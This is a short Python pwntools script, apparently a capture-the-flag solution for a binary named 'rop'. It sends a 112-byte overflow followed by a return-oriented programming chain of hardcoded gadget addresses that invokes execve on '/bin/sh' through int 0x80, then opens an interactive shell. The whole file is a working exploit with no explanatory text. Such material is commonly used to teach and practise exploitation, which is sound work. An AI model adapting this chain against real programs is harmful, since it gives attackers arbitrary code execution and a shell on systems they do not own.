#!/usr/bin/env python
from pwn import *
local = 1
if local:
	p = process('./rop')
else:
	p = remote('127.0.0.1', 8888)
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
bin_sh = 0x080be408
payload = (
    'A' * 112 +
	p32(pop_eax_ret) + 
	p32(11) + 
	p32(pop_edx_ecx_ebx_ret) + 
	p32(0) + 
	p32(0) + 
	p32(bin_sh) + 
	p32(int_0x80)
)
p.sendline(payload)
p.interactive()
